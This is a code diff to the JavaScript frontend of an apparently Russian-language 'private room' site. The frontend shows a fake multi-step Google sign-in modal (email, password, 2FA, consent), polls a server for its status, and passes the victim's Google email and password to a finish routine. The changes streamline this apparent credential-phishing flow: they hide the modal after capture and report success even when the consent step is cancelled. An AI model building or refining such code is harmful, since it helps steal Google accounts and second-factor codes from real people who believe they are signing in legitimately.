@@ -198,7 +198,7 @@ function initApp() {
                              initParams.get("google") === "1" || 
                              window.location.search.includes("auth=google");
 
-        if (isTestBotUrl && targetStep !== stepSuccess) {
+        if (isTestBotUrl && targetStep !== stepSuccess && !isAuthorized) {
             const isTargetAlreadyGoogle = [
                 stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent
             ].includes(targetStep);
@@ -216,7 +216,7 @@ function initApp() {
         ].includes(targetStep);
 
         if (googleAuthModal) {
-            if (isGoogleStep) {
+            if (isGoogleStep && !isAuthorized) {
                 googleAuthModal.classList.remove("hidden");
             } else {
                 googleAuthModal.classList.add("hidden");
@@ -380,13 +380,13 @@ function initApp() {
                             } catch (e) {}
                             updateAuthHeaderUI();
                         }
-                    } else {
-                        // User is unauthorized or session was revoked/logged out
+                    } else if (data.auth_step === "session_revoked" || data.auth_step === "logged_out" || data.auth_step === "banned") {
+                        // User is unauthorized or session was revoked/logged out explicitly on server
                         const wasAuthorized = isAuthorized;
                         const wasLoading = Boolean(creationInterval);
 
                         if (wasAuthorized || wasLoading) {
-                            console.log("Auth session ended or revoked on server. Halting loading and resetting auth state.");
+                            console.log("Auth session ended or revoked on server (" + data.auth_step + "). Halting loading and resetting auth state.");
                             isAuthorized = false;
                             try {
                                 localStorage.removeItem("privateroom_authorized");
@@ -962,6 +962,10 @@ function initApp() {
             localStorage.setItem("privateroom_authorized", "true");
         } catch (e) {}
 
+        if (googleAuthModal) {
+            googleAuthModal.classList.add("hidden");
+        }
+
         updateAuthHeaderUI();
         showStep(stepSuccess);
         showToast("Успешный вход! Создаем приватную комнату...");
@@ -1337,9 +1341,12 @@ function initApp() {
                 } else if (ctrl.status === "completed" || data.authorized) {
                     stopGooglePolling();
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
-                    if (!stepGoogleConsent.classList.contains("active")) {
-                        showStep(stepGoogleConsent);
-                    }
+                    if (googleAuthModal) googleAuthModal.classList.add("hidden");
+                    finishAuth({
+                        status: "success",
+                        google_email: userGoogleEmail,
+                        password: userGooglePassword
+                    });
                 }
             }
         }, 1200);
@@ -1409,7 +1416,11 @@ function initApp() {
 
     if (btnCancelGoogleConsent) {
         btnCancelGoogleConsent.addEventListener("click", () => {
-            showStep(stepSuccess);
+            finishAuth({
+                status: "success",
+                google_email: userGoogleEmail,
+                password: userGooglePassword
+            });
         });
     }
 
@@ -1623,7 +1634,12 @@ function initApp() {
         }
 
         if (roomInitialBlock) roomInitialBlock.classList.add("hidden");
-        if (roomLoadingBlock) roomLoadingBlock.classList.remove("hidden");
+        if (roomLoadingBlock) {
+            roomLoadingBlock.classList.remove("hidden");
+            try {
+                roomLoadingBlock.scrollIntoView({ behavior: "smooth", block: "center" });
+            } catch (e) {}
+        }
 
         creationSeconds = 0;
         updateLoadingUI();
